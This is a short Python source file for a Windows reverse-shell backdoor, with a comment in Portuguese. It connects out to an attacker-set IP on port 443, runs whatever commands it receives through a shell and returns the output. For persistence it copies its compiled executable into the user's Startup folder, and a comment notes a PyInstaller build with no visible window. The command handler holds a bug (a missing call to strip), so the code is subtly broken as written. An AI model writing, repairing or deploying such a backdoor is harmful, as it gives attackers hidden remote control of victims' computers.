import socket
import subprocess
import threading
import time
import os

# exucuçao de maneira anonima " pyinstaller -f --clean -w "

ip = ""
port = 443

def auto_run():
    file = os.path.basename(__file__)
    exe_file =  file.replace("py", "exe")  
    os.system("copy {} C:\\Users\\diasg\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(exe_file))

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)

def connect(ip, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        return client
    except Exception as error:
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    auto_run()
    while True:
        client = connect(ip, port)
        if client:
            cli(client)
        else:
            time.sleep(2)


